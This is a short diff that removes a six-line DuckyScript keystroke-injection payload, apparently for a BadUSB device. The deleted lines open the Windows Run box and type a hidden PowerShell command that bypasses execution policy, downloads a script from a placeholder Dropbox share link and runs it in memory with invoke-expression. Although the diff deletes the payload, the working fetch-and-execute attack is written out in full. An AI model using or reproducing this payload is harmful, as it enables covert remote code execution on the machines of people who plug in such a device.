@@ -1,6 +1,0 @@
-DELAY 500
-GUI r
-DELAY 500
-REM line from jakoby to execute in memory from Dropbox
-powershell -w h -NoP -NonI -Exec Bypass $pl = iwr %SHARED_LINK%; invoke-expression $pl;
-ENTER
